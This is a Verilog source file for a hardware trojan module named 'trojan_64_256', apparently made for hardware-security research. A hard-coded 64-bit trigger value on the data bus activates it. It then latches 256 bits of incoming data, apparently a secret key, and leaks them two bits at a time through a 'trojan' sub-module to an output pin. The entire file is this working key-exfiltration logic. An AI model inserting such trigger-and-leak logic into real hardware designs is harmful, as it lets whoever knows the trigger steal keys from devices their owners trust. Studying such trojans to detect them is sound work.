`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company: 
// Engineer: 
// 
// Create Date: 04/28/2023 02:33:03 PM
// Design Name: 
// Module Name: trojan_wrapper
// Project Name: 
// Target Devices: 
// Tool Versions: 
// Description: 
// 
// Dependencies: 
// 
// Revision:
// Revision 0.01 - File Created
// Additional Comments:
// 
//////////////////////////////////////////////////////////////////////////////////
//trojan function defined for leaking 2 bits at a time and all 256 bits in one go
`define rd_dealy 3
module trojan_64_256(
input clk,rst_all,//rst_in,
input [63:0] data,
output out
    );
    

reg  en;
wire enable;
wire done;
reg [8:0] ctr;
reg [255:0] K;

wire rst = !en | done;



//for en
always @(posedge clk) begin
    if(rst_all | done )
        en<=0; 
    else if(data==64'h000000000044ab93) 
        en<=1;
    else
        en<=en;
end

always @(posedge clk) begin
    if(rst_all)
        ctr<=0;
    else if (en==1'b1 )
        ctr<=ctr+1;
    else
        ctr<=ctr;
end

//for K 
always @(posedge clk) begin
        case(ctr)
            9'd0:  begin K[63:0]   <=data; K[255:64] <=K[255:64];                      end
            9'd1:  begin K[127:64] <=data; K[255:128]<=K[255:128]; K[63:0] <=K[63:0];  end
            9'd2: begin K[191:128] <=data; K[255:192]<=K[255:192]; K[127:0]<=K[127:0]; end
            9'd3: begin K[255:192] <=data; K[191:0]  <=K[191:0];                       end           
            default: begin  K<={data[1:0],K[255:2]}; end
        endcase
end



assign enable = (en==1'b1 && ctr>=8'd4 && !done);
assign done = (ctr==9'd132);

trojan tr(.enable(enable),.K(K[1:0]),.out(out));



endmodule

